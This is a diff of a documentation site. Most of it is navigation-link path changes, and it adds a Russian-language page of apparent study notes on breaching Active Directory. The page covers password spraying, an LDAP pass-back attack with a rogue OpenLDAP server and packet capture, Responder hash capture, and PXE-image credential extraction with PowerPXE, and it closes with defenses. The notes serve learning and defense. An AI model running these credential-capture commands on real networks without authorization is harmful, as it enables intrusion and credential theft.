-      <a href="Alternate_Data_Streams/" class="md-nav__link">
+      <a href="../../Alternate_Data_Streams/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -2718,7 +2915,7 @@
   
   
     <li class="md-nav__item">
-      <a href="Powershell_commandlets/" class="md-nav__link">
+      <a href="../../Powershell_commandlets/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -2738,7 +2935,7 @@
   
   
     <li class="md-nav__item">
-      <a href="System_utilities/" class="md-nav__link">
+      <a href="../../System_utilities/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -2758,7 +2955,7 @@
   
   
     <li class="md-nav__item">
-      <a href="Windows_Services/" class="md-nav__link">
+      <a href="../../Windows_Services/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -2778,7 +2975,7 @@
   
   
     <li class="md-nav__item">
-      <a href="windows_users/" class="md-nav__link">
+      <a href="../../windows_users/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -2798,7 +2995,7 @@
   
   
     <li class="md-nav__item">
-      <a href="Windows_persistence/" class="md-nav__link">
+      <a href="../../Windows_persistence/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -2876,7 +3073,7 @@
           
           
           <div class="md-nav__link md-nav__container">
-            <a href="../Technologies/" class="md-nav__link ">
+            <a href="../../../Technologies/" class="md-nav__link ">
               
   
   <span class="md-ellipsis">
@@ -2908,7 +3105,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../Technologies/FTP/" class="md-nav__link">
+      <a href="../../../Technologies/FTP/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -2928,7 +3125,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../Technologies/Hashing/" class="md-nav__link">
+      <a href="../../../Technologies/Hashing/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -2948,7 +3145,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../Technologies/IMAP/" class="md-nav__link">
+      <a href="../../../Technologies/IMAP/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -2968,7 +3165,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../Technologies/Kerberos/" class="md-nav__link">
+      <a href="../../../Technologies/Kerberos/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -2988,7 +3185,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../Technologies/MySQL/" class="md-nav__link">
+      <a href="../../../Technologies/MySQL/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -3008,7 +3205,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../Technologies/NFS/" class="md-nav__link">
+      <a href="../../../Technologies/NFS/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -3028,7 +3225,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../Technologies/NTLM/" class="md-nav__link">
+      <a href="../../../Technologies/NTLM/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -3048,7 +3245,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../Technologies/POP3/" class="md-nav__link">
+      <a href="../../../Technologies/POP3/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -3068,7 +3265,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../Technologies/python/" class="md-nav__link">
+      <a href="../../../Technologies/python/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -3088,7 +3285,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../Technologies/SMB/" class="md-nav__link">
+      <a href="../../../Technologies/SMB/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -3108,7 +3305,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../Technologies/SMTP/" class="md-nav__link">
+      <a href="../../../Technologies/SMTP/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -3128,7 +3325,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../Technologies/SQLite/" class="md-nav__link">
+      <a href="../../../Technologies/SQLite/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -3148,7 +3345,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../Technologies/telnet/" class="md-nav__link">
+      <a href="../../../Technologies/telnet/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -3168,7 +3365,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../Technologies/XML/" class="md-nav__link">
+      <a href="../../../Technologies/XML/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -3222,7 +3419,7 @@
           
           
           <div class="md-nav__link md-nav__container">
-            <a href="../Documents/" class="md-nav__link ">
+            <a href="../../../Documents/" class="md-nav__link ">
               
   
   <span class="md-ellipsis">
@@ -3254,7 +3451,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../Documents/683-p/" class="md-nav__link">
+      <a href="../../../Documents/683-p/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -3274,7 +3471,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../Documents/719-p/" class="md-nav__link">
+      <a href="../../../Documents/719-p/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -3301,7 +3498,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../disclaimer/" class="md-nav__link">
+      <a href="../../../disclaimer/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -3320,7 +3517,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../Update_log/" class="md-nav__link">
+      <a href="../../../Update_log/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -3353,6 +3550,169 @@
     
   
   
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Содержание
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#osint" class="md-nav__link">
+    OSINT и фишинг
+  </a>
+  
+    <nav class="md-nav" aria-label="OSINT и фишинг">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#osint_1" class="md-nav__link">
+    OSINT
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#ntlm" class="md-nav__link">
+    NTLM аутентификация
+  </a>
+  
+    <nav class="md-nav" aria-label="NTLM аутентификация">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#ntlm-netntlm" class="md-nav__link">
+    NTLM и NetNTLM
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#password-spraying" class="md-nav__link">
+    Брутфорс логинов и password spraying
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#ldap" class="md-nav__link">
+    LDAP
+  </a>
+  
+    <nav class="md-nav" aria-label="LDAP">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#ldap-bind-credentials" class="md-nav__link">
+    LDAP bind credentials
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ldap-pass-back-attacks" class="md-nav__link">
+    LDAP Pass-back Attacks
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    Ретрансляция аутентификации
+  </a>
+  
+    <nav class="md-nav" aria-label="Ретрансляция аутентификации">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#netntlm-llmnr-nbt-ns-wapd" class="md-nav__link">
+    Перехват NetNTLM сведений из LLMNR, NBT-NS, WAPD
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#challenge" class="md-nav__link">
+    Перехват challenge
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#microsoft-deployment-toolkit" class="md-nav__link">
+    Использование Microsoft Deployment Toolkit
+  </a>
+  
+    <nav class="md-nav" aria-label="Использование Microsoft Deployment Toolkit">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#mdt-sccm" class="md-nav__link">
+    MDT и SCCM
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pxe-boot" class="md-nav__link">
+    PXE Boot
+  </a>
+  
+    <nav class="md-nav" aria-label="PXE Boot">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#pxe-boot_1" class="md-nav__link">
+    Извлечение данных из PXE Boot образа
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    Конфигурационные файлы
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    Как со всем этим бороться?
+  </a>
+  
+</li>
+      
+    </ul>
+  
 </nav>
                   </div>
                 </div>
@@ -3366,10 +3726,184 @@
                   
 
 
-<h1 id="windows-notes-and-tips">Windows notes and tips</h1>
-<hr />
-<p>UAC по умолчанию не применим для учетки локального администратора.</p>
-<hr />
+<h1 id="active-directory">Проникновение в Active Directory</h1>
+<p>Перед тем как возможно будет использовать ошибки конфигурации в AD для эскалации привилегий, перемещения по сети и достижения конечных целей, необходимо получить первоначальный доступ. В качестве первоначального доступа подойдет любая учётка, нужно просто попасть в AD, чтобы потом узнать о ней побольше.</p>
+<h2 id="osint">OSINT и фишинг</h2>
+<p>Два популярных метода для получения начальных кредов в AD  -  <strong>OSINT</strong> и <strong>фишинг</strong>. Далее немного подробнее про OSINT.</p>
+<h3 id="osint_1">OSINT</h3>
+<p>Представляет собой процесс сбора и анализа информации о человеке из открытых источников, в Сети и не только. В части касающейся рассматриваемой темы источники могут быть следующими:</p>
+<ul>
+<li>
+<p>Пользователи задающие вопросы на Stack Overflow и подобных сервисах могут указать в вопросе различные конфидецниальные сведения</p>
+</li>
+<li>
+<p>Разработчики использующие GitHub и подобные сервисы, могут также запушить логины/пароли которые зашиты в коде</p>
+</li>
+<li>
+<p>Крэды могут быть найдены в различных уже слитых данных. Часто бывает так, что пользователь использует одни и те же пароли и на работе и в личных целях.</p>
+</li>
+</ul>
+<p>Для проверки найденных сведений на валидность, можно использовать сервисы которые аутентифицируются через NTLM, об этом будет написано ниже.</p>
+<h2 id="ntlm">NTLM аутентификация</h2>
+<h3 id="ntlm-netntlm">NTLM и NetNTLM</h3>
+<p>New Technology LAN Manager (NTLM) - набор протоколов безопасности используемый для аутентификации пользователей в AD. </p>
+<p>NTLM может быть использован для аутентификации путем использования механизма Вызов-ответ (Challenge-response-based scheme) под названием NetNTLM. Этот механизм часто используется сервисами в сети. Кроме того, такие сервисы могут иметь выход в Интернет: Почтовые сервисы использующие OWA (Outlook Web App) в качестве аутентификационного портала, RDP серверы, VPN интегрированные с AD, различные веб приложения.</p>
+<p>NetNTLM, который также часто называют аутентификация NTLM, позволяет приложениям выполнять роль "человека-по-середине" между пользователем и AD. </p>
+<p><img alt="" src="/images/NTLM_auth.png" /></p>
+<h3 id="password-spraying">Брутфорс логинов и password spraying</h3>
+<p>Рассмотрим ситуацию. Предположим с помощью OSINT нам удалось собрать множество аккаунтов пользователей. Кроме того, обнаружено доступное из Интернета веб приложение которое использует NTLM аутентификацию. Можно брутить каждый логин отдельно, однако, это скорее всего учётка будет заблокирована в процессе. Можно использовать Password Spaying атаку, при которой для множества учёток будет использоватся один пароль. При такой атаке вероятность блокирования учётки уменьшается, но стоит иметь в виду, что такая атака тоже легко обнаруживается по возросшему количеству неудачных попыток входа большого количества пользователей. </p>
+<p>Продолжим выдумывать ситуацию: в организации используется стандартный пароль для первого входа в систему или при просьбе сбросить пароль. Пароль этот тоже удалось получить с помощью OSINT. При таким исходных данных проведение password spraying атаку провести не составит труда. Сделать это можно как с помощью wireshark, так и с помощью самописных реализаций. Пример такой реализации можно найти тут.</p>
+<h2 id="ldap">LDAP</h2>
+<h3 id="ldap-bind-credentials">LDAP bind credentials</h3>
+<p>В LDAP v3 есть два варианта аутентификации - простой и SASL (Simple Authentication and Security Layer).</p>
+<p>Простая аутентификация делится на следующие способы:</p>
+<ul>
+<li>
+<p>"Анонимная аутентификация", при которой клиенту предоставляется анонимный статус для LDAP.</p>
+</li>
+<li>
+<p>"Аутентификация без аутентификации" - используется только для целей регистрации, не должна предоставлять доступ клиенту.</p>
+</li>
+<li>
+<p>"Аутентификация по имени или паролю" - предоставляет доступ к серверу на основе предоставленных учетных данных.</p>
+</li>
+</ul>
+<p>При использовании SASL сервер LDAP передает аутентификационную информацию каком-либо другому механизму аутентификации, как правило - Kerberos. Отправляюься такие сообщения в формате LDAP.</p>
+<p>Важно отметить, что по умолчанию LDAP передает все эти сообщения в plain text. Нужно добавлять шифрование TLS или подобное, чтобы сохранить передаваемые имена пользователей и пароли в безопасности.</p>
+<p><img alt="" src="/images/NTLM_auth.png" /></p>
+<h3 id="ldap-pass-back-attacks">LDAP Pass-back Attacks</h3>
+<p>Представим ситуацию, что злоумышленнику удалось подключить своё устройство в сеть. В сети нет <code>802.1x</code> поэтому он без проблем зашел на вебморду сетевого принтера используя стандартный логин/пароль который ленивые админы забыли поменять. Сетевой принтер использует LDAP аутентификацию типа SASL (см. рисунок выше)</p>
+<p>Попав на устройство, можно заменить адрес DC на адрес своего устройства. После чего запустить на нём <code>nc -lvp 389</code> и ждать получения пакетов. Однако, если не поднять на устройстве LDAP сервер, принтер не сможет установить LDAP соединение, а следовательно необходимую информацию - аутентификационные данные принтера - получить не удастся.</p>
+<p>В качестве поддельного LDAP сервера будем использовать OpenLDAP:</p>
+<div class="language-bash highlight"><span class="filename">Установка OpenLDAP и открытие утилиты его конфигурирования</span><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>sudo<span class="w"> </span>apt-get<span class="w"> </span>update<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>sudo<span class="w"> </span>apt-get<span class="w"> </span>-y<span class="w"> </span>install<span class="w"> </span>slapd<span class="w"> </span>ldap-utils<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>sudo<span class="w"> </span>systemctl<span class="w"> </span><span class="nb">enable</span><span class="w"> </span>slapd
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>sudo<span class="w"> </span>dpkg-reconfigure<span class="w"> </span>-p<span class="w"> </span>low<span class="w"> </span>slapd
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>Далее:
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a><span class="c1"># 1. Скипаем конфигурацию сервера</span>
+</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a><span class="c1"># 2. Записывается целевой домен и organization name</span>
+</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a><span class="c1"># 3. Записывается любой пароль Администратора</span>
+</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a><span class="c1"># 4. В качестве БД выбирается MDB</span>
+</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a><span class="c1"># 5. Отказываемся от удаления базы в случае очистки</span>
+</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a><span class="c1"># 6. Соглашаемся на перемещение файлов старой БД перед созданием новой</span>
+</span></code></pre></div>
+<p>Далее, в качестве механизма аутентификации нужно оставить только <code>PLAIN</code> и <code>LOGIN</code>, для этого создаётся новый конфигурационный файл определяющий свойства безопасности SASL аутентификации LDAP:</p>
+<div class="language-bash highlight"><span class="filename">olcSaslSecProps.ldif</span><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>dn:<span class="w"> </span><span class="nv">cn</span><span class="o">=</span>config
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>replace:<span class="w"> </span>olcSaslSecProps
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>olcSaslSecProps:<span class="w"> </span>noanonymous,minssf<span class="o">=</span><span class="m">0</span>,passcred
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>
+</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a><span class="c1"># noanonymous - запрещает подключатся анонимно</span>
+</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a><span class="c1"># minsf - определяет минимальный уровень безопасности. 0 = нет никакой безопасности.</span>
+</span></code></pre></div>
+<p>Перечитываем новый конфиг и перезапускаем сервер:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>sudo<span class="w"> </span>ldapmodify<span class="w"> </span>-Y<span class="w"> </span>EXTERNAL<span class="w"> </span>-H<span class="w"> </span>ldapi://<span class="w"> </span>-f<span class="w"> </span>./olcSaslSecProps.ldif<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>sudo<span class="w"> </span>service<span class="w"> </span>slapd<span class="w"> </span>restart
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="c1"># Проверяем, что всё работает как нужно:</span>
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>$<span class="w"> </span>ldapsearch<span class="w"> </span>-H<span class="w"> </span>ldap://<span class="w"> </span>-x<span class="w"> </span>-LLL<span class="w"> </span>-s<span class="w"> </span>base<span class="w"> </span>-b<span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span>supportedSASLMechanisms
+</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>
+</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a>dn:
+</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a>supportedSASLMechanisms:<span class="w"> </span>PLAIN
+</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a>supportedSASLMechanisms:<span class="w"> </span>LOGIN
+</span></code></pre></div>
+<p>Готово! Для просмотра пакетов которые принтер отправляет фальшивому LDAP серверу осталось запустить сниффер, например tcpdump, и в перехваченных пакетах искать аутентификационные сведения:</p>
+<div class="language-Bash highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>sudo<span class="w"> </span>tcpdump<span class="w"> </span>-SX<span class="w"> </span>-i<span class="w"> </span>breachad<span class="w"> </span>tcp<span class="w"> </span>port<span class="w"> </span><span class="m">389</span>
+</span></code></pre></div>
+<h2 id="_1">Ретрансляция аутентификации</h2>
+<p>Вспоминая о том, как устроена NetNTLM аутентификация в связке с <a href="/Technologies/SMB">SMB</a> приходим к выводу, что в случае проведения MitM атаки возможно либо получить NTLM хэши чтобы попытаться извлечь из них пароли в случае их недостаточной укрепленности, либо выдать себя серверу за аутентифицированного клиента.</p>
+<h3 id="netntlm-llmnr-nbt-ns-wapd">Перехват NetNTLM сведений из LLMNR, NBT-NS, WAPD</h3>
+<p>В Windows сети проходит множество трафика содержащего в себе NetNTLM челленджи. Примером является трафик протоколов которые используются для локального определения имён без привлечения DNS: Link-Local Multicast Name Resolution - <code>LLMR</code>, NetBIOS Name Service - <code>NBT-NS</code>, Web Proxy Auto-Discovery - <code>WPAD</code>. Все они пытаются достучатся до соседей по широковещательному домену через бродкаст. Обычно, такие запросы отбрасываются, однако некоторое ПО, такое как <a href="https://github.com/lgandx/Responder">Responder</a> может перехватывать такие сообщения и отправлять в ответ модифицированные ответы, сообщающие о том, что он и есть тот сервис который нужен запрашивающему.</p>
+<blockquote>
+<p>Следует помнить, что работает он очень шумно</p>
+</blockquote>
+<p>Для запуска достаточно ввести <code>sudo responder -I $if-name</code> и ожидать перехваченных данных.</p>
+<p>Далее, хэш отправляется в hascat или скармливается Джону.</p>
+<h3 id="challenge">Перехват challenge</h3>
+<p>Еще одним, не очень популярным, способом получения сведений NTLM авторизации является непосредственный перехват challenge. Сделать его однако намного труднее, для его успешной реализации нужно одновременное выполнение следующих обстоятельств:</p>
+<ul>
+<li>
+<p>Подписывание SMB должно быть или отключено или включено, но не задействовано.</p>
+</li>
+<li>
+<p>Исследуемая учётная запись должна обладать соответствующими привилегиями на сервере. В идеале конечно перехватить учётку с админискими правами для дальнешего закрепления на узле.</p>
+</li>
+</ul>
+<h2 id="microsoft-deployment-toolkit">Использование Microsoft Deployment Toolkit</h2>
+<p>В крупных организациях часто используются инструменты для автоматизации развертывания и конфигурирования образов ОС. Неверная конфигурация таких инструментов может привести к проникновению в AD.</p>
+<h3 id="mdt-sccm">MDT и SCCM</h3>
+<p>Одним из таких инструментов является MDT (Microsoft Deployment Toolkit) который в том числе содержит в себе централизованное хранилище образов различных версий ОС.</p>
+<p>Обычно MDT интегрируется с SCCM (Microsoft System Configuration Manager) который используется для централизованного управляения обновлениями различного ПО. Суть их совместного использования заключается в создании преконфигурированных образов для дальнейшей их установке по сети. Останется только воткнуть кабель в новую машину и образ с нужным предустановленным ПО раскатается автоматически.</p>
+<p>В качестве примера, рассмотрим способ проникновения в AD с помощью Preboot Execution Environment (PXE) Boot</p>
+<h3 id="pxe-boot">PXE Boot</h3>
+<p>Образы PXE boot - те самые образы хранящиеся в MDT и устанавливающиеся по сети. В процессе обращения к DHCP, клиент получает не только IP адрес, но и информацию о MDT сервере, к которому обращается в дальнейшем, для получения нужного образа.</p>
+<p><img alt="" src="/images/PXE_boot.png" /></p>
+<p>Исходя из изображения выше возможно:</p>
+<ul>
+<li>
+<p>Внедрить в образ нужные компоненты, например учетку локального админа</p>
+</li>
+<li>
+<p>Использовать password scraping атаку, для восстановления учётных сведений AD в процессе установки</p>
+</li>
+</ul>
+<h4 id="pxe-boot_1">Извлечение данных из PXE Boot образа</h4>
+<p>Получив сведения о MDT сервере (например из DHCP ответа) можно будет скачать с него имеющиеся  файлы <code>.bsd</code> которые содержат информацию об образах для различных архитектур ОС, а также адрес и имя непоспредственно самого образа в формате <code>.wmi</code> . <code>.bsd</code> файлы должны располагатся в <code>/Tmp/</code> сервера. </p>
+<blockquote>
+<p>Работает <code>MDT</code> через <code>TFTP</code> который не поддерживает листинг файлов в директории.</p>
+</blockquote>
+<p>Получив <code>.bsd</code> файл, распакуем его с помощью <a href="https://github.com/wavestone-cdt/powerpxe">Powerpxe</a></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>##### Скачиваем образ с MDT сервера с помощью TFTP
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>C:\Users\dummy\Documents\Z&gt; tftp -i &lt;MDT-IP&gt; GET &quot;\Tmp\x64{35...34}.bcd&quot; conf.bcd
+</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>
+</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a>##### Читаем, что там внутри образа
+</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a>
+</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a>C:\Users\dummy\Documents\Z&gt; powershell -executionpolicy bypass
+</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a>Windows PowerShell
+</span><span id="__span-4-9"><a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a>Copyright (C) Microsoft Corporation. All rights reserved.   
+</span><span id="__span-4-10"><a id="__codelineno-4-10" name="__codelineno-4-10" href="#__codelineno-4-10"></a>
+</span><span id="__span-4-11"><a id="__codelineno-4-11" name="__codelineno-4-11" href="#__codelineno-4-11"></a>PS C:\Users\dummy\Documents\Z&gt; Import-Module .\PowerPXE.ps1
+</span><span id="__span-4-12"><a id="__codelineno-4-12" name="__codelineno-4-12" href="#__codelineno-4-12"></a>PS C:\Users\dummy\Documents\Z&gt; $BCDFile = &quot;conf.bcd&quot;
+</span><span id="__span-4-13"><a id="__codelineno-4-13" name="__codelineno-4-13" href="#__codelineno-4-13"></a>PS C:\Users\dummy\Documents\Z&gt; Get-WimFile -bcdFile $BCDFile
+</span><span id="__span-4-14"><a id="__codelineno-4-14" name="__codelineno-4-14" href="#__codelineno-4-14"></a>&gt;&gt; Parse the BCD file: conf.bcd
+</span><span id="__span-4-15"><a id="__codelineno-4-15" name="__codelineno-4-15" href="#__codelineno-4-15"></a>&gt;&gt;&gt;&gt; Identify wim file : &lt;PXE Boot Image Location&gt;
+</span><span id="__span-4-16"><a id="__codelineno-4-16" name="__codelineno-4-16" href="#__codelineno-4-16"></a>&lt;PXE Boot Image Location&gt;
+</span><span id="__span-4-17"><a id="__codelineno-4-17" name="__codelineno-4-17" href="#__codelineno-4-17"></a>
+</span><span id="__span-4-18"><a id="__codelineno-4-18" name="__codelineno-4-18" href="#__codelineno-4-18"></a>##### Узнав имя wim файла загружаем его с сервера MDT-IP
+</span><span id="__span-4-19"><a id="__codelineno-4-19" name="__codelineno-4-19" href="#__codelineno-4-19"></a>
+</span><span id="__span-4-20"><a id="__codelineno-4-20" name="__codelineno-4-20" href="#__codelineno-4-20"></a>PS C:\Users\dummy\Documents\Z&gt; tftp -i &lt;MDT-IP&gt; GET &quot;&lt;PXE Boot Image Location&gt;&quot; pxeboot.wim
+</span></code></pre></div>
+<p>Имея на руках нужный образ <code>pxeboot.wim</code> можно извлечь из него данные. Кроме того, как писалось выше, можно добавить в образ учётку локального администратора. Подробнее об этом можно почитать <a href="https://www.riskinsight-wavestone.com/en/2020/01/taking-over-windows-workstations-pxe-laps/">здесь</a>.</p>
+<p>Для извлечения учётных данных из <code>pxeboot.wim</code> снова воспользуемся <code>PowerPXE</code>:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>PS C:\Users\dummy\Documents\Z&gt; Get-FindCredentials -WimFile pxeboot.wim
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>&gt;&gt; Open pxeboot.wim
+</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>&gt;&gt;&gt;&gt; Finding Bootstrap.ini
+</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>&gt;&gt;&gt;&gt; &gt;&gt;&gt;&gt; DeployRoot = \\DUMMYMDT\MTDBuildLab$
+</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a>&gt;&gt;&gt;&gt; &gt;&gt;&gt;&gt; UserID = &lt;account&gt;
+</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a>&gt;&gt;&gt;&gt; &gt;&gt;&gt;&gt; UserDomain = DUMMY
+</span><span id="__span-5-7"><a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a>&gt;&gt;&gt;&gt; &gt;&gt;&gt;&gt; UserPassword = &lt;password&gt;
+</span></code></pre></div>
+<h2 id="_2">Конфигурационные файлы</h2>
+<p>Некоторые конфигурационные файлы обнаруженные на хосте могут содержать в себе учётные данные. Для автоматизированного поиска и извлечения полезных данных существуют различные утилиты, например <a href="https://github.com/GhostPack/Seatbelt">Seatbelt</a></p>
+<h2 id="_3">Как со всем этим бороться?</h2>
+<p>В общем случае рекомендации сводятся к следующему:</p>
+<ul>
+<li>
+<p>Обучение и повышение осведомленности пользователей. Результат этой деятельности будет способстовать тому, что пользователи будут аккуратнее относится к данным, в том числе к аутентификационным, будут знать о фишинге и других способах внедрения в сеть, что в совокупности уменьшит поверхность атаки.</p>
+</li>
+<li>
+<p>Пересмотреть необходимость размещения сервисов использующих NTLM и LDAP непосредственно в Интернете. Гораздо безопаснее размещать их во внутренней сети, подключится к которой можно будет через VPN</p>
+</li>
+<li>
+<p>Рассмотреть меры обеспечивающие защиту сети на канальном уровне: решения класса <a href="https://www.cisco.com/c/en/us/products/security/what-is-network-access-control-nac.html#~how-nac-works">NAC</a>, в частности использование <code>802.1x</code> и т.п.</p>
+</li>
+<li>
+<p>Использование <code>SMB Singning</code> для невозможности применения атак класса SMB relay</p>
+</li>
+<li>
+<p>Следование принципу наименьших привилегий для уменьшения возможности использования скомпроментированных учёток.</p>
+</li>
